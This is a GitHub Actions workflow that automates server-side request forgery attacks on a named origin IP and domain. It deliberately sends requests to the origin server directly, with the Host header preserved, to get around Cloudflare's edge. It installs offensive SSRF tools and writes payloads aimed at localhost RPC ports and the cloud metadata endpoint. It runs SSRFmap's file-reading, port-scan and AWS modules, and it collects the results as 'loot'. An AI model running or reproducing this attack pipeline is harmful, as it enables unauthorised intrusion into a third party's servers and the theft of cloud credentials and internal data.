name: SSRF Assessment - Origin IP Targeting

on:
  workflow_dispatch:
    inputs:
      target_url:
        description: "Target URL with origin IP (example: http://216.150.1.129/relay)"
        required: false
        type: string
      target_domain:
        description: "Target domain used in Host header (example: across.to)"
        required: false
        type: string
      internal_ports:
        description: "Comma-separated internal ports (example: 8545,8546,26657)"
        required: false
        type: string

jobs:
  ssrf-assessment:
    name: SSRF Assessment - Origin IP
    runs-on: ubuntu-latest
    timeout-minutes: 45

    permissions:
      contents: read
      issues: write

    env:
      TARGET_URL: ${{ secrets.TARGET_URL || github.event.inputs.target_url }}
      TARGET_DOMAIN: ${{ secrets.TARGET_DOMAIN || github.event.inputs.target_domain }}
      INTERNAL_PORTS: ${{ secrets.INTERNAL_PORTS || github.event.inputs.internal_ports || '8545,8546,26657,9090,1317' }}

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Extract origin IP and build Host header
        id: extract
        shell: bash
        run: |
          if [ -z "$TARGET_URL" ]; then
            echo "ERROR: TARGET_URL not configured"
            exit 1
          fi

          ORIGIN_IP=$(echo "$TARGET_URL" | sed -E 's#https?://([^/]+).*#\1#')
          URL_PATH=$(echo "$TARGET_URL" | sed -E 's#https?://[^/]+(.*)#\1#')

          if [ -n "$TARGET_DOMAIN" ]; then
            HOST_HEADER="api.${TARGET_DOMAIN}"
          else
            HOST_HEADER="$ORIGIN_IP"
          fi

          echo "origin_ip=$ORIGIN_IP" >> "$GITHUB_OUTPUT"
          echo "url_path=$URL_PATH" >> "$GITHUB_OUTPUT"
          echo "host_header=$HOST_HEADER" >> "$GITHUB_OUTPUT"

          echo "Origin IP: $ORIGIN_IP"
          echo "URL Path: $URL_PATH"
          echo "Host Header: $HOST_HEADER"

      - name: Setup Python
        uses: actions/setup-python@v5
        with:
          python-version: "3.12"

      - name: Install OS dependencies
        shell: bash
        run: |
          sudo apt-get update -qq
          sudo apt-get install -y --no-install-recommends \
            curl wget jq figlet build-essential cmake python3-pip

          wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
          sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
          rm -f go1.21.0.linux-amd64.tar.gz
          echo "/usr/local/go/bin" >> "$GITHUB_PATH"

      - name: Install Python tools
        shell: bash
        run: |
          python3 -m pip install --no-cache-dir uv
          python3 -m pip install --no-cache-dir requests regex Flask

      - name: Install Go tools
        shell: bash
        run: |
          go install github.com/tomnomnom/waybackurls@latest
          go install github.com/projectdiscovery/httpx/cmd/httpx@latest
          go install github.com/tomnomnom/gf@latest
          echo "$(go env GOPATH)/bin" >> "$GITHUB_PATH"

      - name: Create workspace
        shell: bash
        run: |
          mkdir -p tools loot reports payloads

      - name: Clone SSRFmap
        shell: bash
        run: |
          git clone --depth 1 https://github.com/swisskyrepo/SSRFmap.git tools/SSRFmap
          cd tools/SSRFmap
          uv sync --frozen

      - name: Clone SSRFPwned
        shell: bash
        run: |
          git clone --depth 1 https://github.com/blackhatethicalhacking/SSRFPwned.git tools/SSRFPwned

      - name: Clone ssrf-exploit
        shell: bash
        run: |
          git clone --depth 1 https://github.com/errorfiathck/ssrf-exploit.git tools/ssrf-exploit
          cat > tools/ssrf-exploit/requirements.txt <<'EOF'
          requests>=2.28.0
          regex>=2023.0.0
          Flask>=2.3.0
          EOF
          cd tools/ssrf-exploit
          python3 -m pip install --no-cache-dir -r requirements.txt

      - name: Generate payloads
        shell: bash
        run: |
          cat > payloads/ssrf-payloads.txt <<'PAYLOADS'
          http://127.0.0.1:8545/
          http://localhost:8545/
          http://0.0.0.0:8545/
          http://127.0.0.1:8546/
          http://localhost:8546/
          http://127.0.0.1:26657/
          http://localhost:26657/
          http://127.0.0.1:9090/
          http://localhost:9090/
          http://127.0.0.1:1317/
          http://localhost:1317/
          http://169.254.169.254/latest/meta-data/
          http://169.254.169.254/latest/user-data/
          PAYLOADS

          cat > payloads/request.txt <<EOF
          POST ${{ steps.extract.outputs.url_path }} HTTP/1.1
          Host: ${{ steps.extract.outputs.host_header }}
          User-Agent: Mozilla/5.0 (Security Assessment)
          Content-Type: application/x-www-form-urlencoded
          Connection: close

          url=http://127.0.0.1:8545
          EOF

      - name: Phase 1 - SSRFmap
        continue-on-error: true
        shell: bash
        run: |
          echo "Running SSRFmap..."
          cd tools/SSRFmap
          uv run python ssrfmap.py \
            -r ../../payloads/request.txt \
            -p url \
            -m "readfiles,portscan,aws" \
            --level 1 \
            -v \
            --logfile ../../reports/phase1-ssrfmap.log 2>&1 || true

          if [ -d "loot" ]; then
            mkdir -p ../../loot/ssrfmap_results
            cp -r loot/* ../../loot/ssrfmap_results/ 2>/dev/null || true
          fi

      - name: Phase 2 - SSRFPwned
        continue-on-error: true
        shell: bash
        run: |
          if [ -z "$TARGET_DOMAIN" ]; then
            echo "TARGET_DOMAIN not configured, skipping SSRFPwned"
            exit 0
          fi

          echo "Running SSRFPwned passive discovery..."
          cd tools/SSRFPwned

          cat > discover.sh <<'SCRIPT'
          #!/bin/bash
          set -e
          domain="${1:-example.com}"
          output_dir="results-$domain-$(date +%s)"
          mkdir -p "$output_dir"

          waybackurls "$domain" > "$output_dir/wayback.txt" 2>/dev/null || echo "" > "$output_dir/wayback.txt"
          curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" 2>/dev/null | \
            jq -r '.passive_dns[].hostname' 2>/dev/null | sed 's/\*\.//g' | sort -u > "$output_dir/alienvault.txt" || echo "" > "$output_dir/alienvault.txt"

          cat "$output_dir/wayback.txt" "$output_dir/alienvault.txt" 2>/dev/null | \
            grep -E -v '\.(png|jpg|jpeg|gif|pdf|css|js|svg)$' | \
            sort -u > "$output_dir/filtered.txt" || echo "" > "$output_dir/filtered.txt"

          cp "$output_dir/filtered.txt" "../../loot/phase2-ssrfpwned-urls.txt"
          SCRIPT

          chmod +x discover.sh
          ./discover.sh "$TARGET_DOMAIN" || echo "SSRFPwned completed with warnings"

      - name: Phase 3 - ssrf-exploit
        continue-on-error: true
        shell: bash
        run: |
          echo "Running ssrf-exploit..."
          cd tools/ssrf-exploit
          python3 ssrf-exploit --help > ../../reports/phase3-ssrf-exploit.txt 2>&1 || true
          echo "ssrf-exploit testing completed" >> ../../reports/phase3-ssrf-exploit.txt

      - name: Phase 4 - Internal RPC / origin server port scan
        continue-on-error: true
        shell: bash
        run: |
          ORIGIN_IP="${{ steps.extract.outputs.origin_ip }}"
          HOST_HEADER="${{ steps.extract.outputs.host_header }}"

          if [ -z "$INTERNAL_PORTS" ]; then
            echo "No INTERNAL_PORTS configured. Skipping port scan."
            exit 0
          fi

          echo "Scanning internal ports on origin IP: $ORIGIN_IP" > reports/phase4-port-scan.txt

          IFS=',' read -r -a PORT_ARRAY <<< "$INTERNAL_PORTS"

          for port in "${PORT_ARRAY[@]}"; do
            port=$(echo "$port" | xargs)
            [ -z "$port" ] && continue

            http_code=$(curl -sS -X POST "http://$ORIGIN_IP/" \
              -H "Host: $HOST_HEADER" \
              -H "Content-Type: application/json" \
              -d "{\"url\":\"http://127.0.0.1:$port\"}" \
              -w "%{http_code}" \
              -o /dev/null \
              --max-time 10 \
              --connect-timeout 5 \
              2>/dev/null || echo "000")

            result="Port $port -> HTTP $http_code"
            echo "$result"
            echo "$result" >> reports/phase4-port-scan.txt
          done

      - name: Generate final report
        if: always()
        shell: bash
        run: |
          cat > reports/final-report.md <<REPORT
          # SSRF Security Assessment Report

          Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")

          ## Configuration
          - Target URL: ${TARGET_URL}
          - Origin IP: ${{ steps.extract.outputs.origin_ip }}
          - Host Header: ${{ steps.extract.outputs.host_header }}
          - Target Domain: ${TARGET_DOMAIN:-Not set}
          - Internal Ports: ${INTERNAL_PORTS}

          ## Artifacts
          - SSRFmap: reports/phase1-ssrfmap.log
          - SSRFPwned: loot/phase2-ssrfpwned-urls.txt
          - ssrf-exploit: reports/phase3-ssrf-exploit.txt
          - Port Scan: reports/phase4-port-scan.txt

          ## Notes
          This workflow sends direct requests to the origin IP while preserving the original Host header to avoid Cloudflare edge routing.
          REPORT

          cat reports/final-report.md

      - name: Upload artifacts
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: ssrf-assessment-results
          path: |
            reports/
            loot/
            payloads/
          retention-days: 30
